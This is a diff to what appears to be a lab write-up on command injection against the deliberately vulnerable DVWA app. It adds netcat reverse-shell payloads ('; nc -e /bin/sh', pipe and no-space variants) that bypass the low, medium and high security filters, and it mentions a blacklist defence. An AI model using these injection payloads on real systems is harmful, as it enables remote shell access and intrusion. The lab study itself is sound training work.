@@ -59,10 +59,39 @@ nc -vv -l -p 8080
 6. Using a command in which we are going to use IP of our OS to fire on website by which we are going to get a connection in out terminal. 
 
 ```
-nc -e /bin/sh IP_Address_of_my_OS 8080
+IP_Address_of_my_OS ; nc -e /bin/sh IP_Address_of_my_OS 8080
 ```
 
 ![image](https://user-images.githubusercontent.com/60937657/194376389-1efd866c-c799-491e-8f69-ea807c39928c.png)
+
+7. Changing the DVWA Security level to medium and then performing command injection using different piping method. 
+
+```
+IP_Address_of_my_OS | nc -e /bin/sh IP_Address_of_my_OS 8080
+``` 
+
+![image](https://user-images.githubusercontent.com/60937657/195312022-384fa5e3-338b-45b8-a3ed-73d796266087.png)
+
+8. Changing the DVWA Security level to high and then performing command injection by just not providing any space while piping. 
+
+```
+IP_Address_of_my_OS|nc -e /bin/sh IP_Address_of_my_OS 8080
+``` 
+
+![image](https://user-images.githubusercontent.com/60937657/195314107-abebbe23-9775-4697-a6ce-192359913e07.png)
+
+**Note** Can also use cat command to display the contents of one or more file without having to open the file for editing. 
+
+![image](https://user-images.githubusercontent.com/60937657/195314710-90a92522-dc9e-417c-b44d-341bc200b5e7.png)
+
+9. Precaution to avoid command injection attack.
+
+To avoid this type of major attack we can add blacklist as given in the image below 
+
+![image](https://user-images.githubusercontent.com/60937657/195316315-3f95c69c-83c0-4a0a-8b3f-8611104f6a4e.png)
+
+![image](https://user-images.githubusercontent.com/60937657/195316066-a42cb9eb-159d-4077-8731-86e7b3123d5c.png)
+
 
 
 
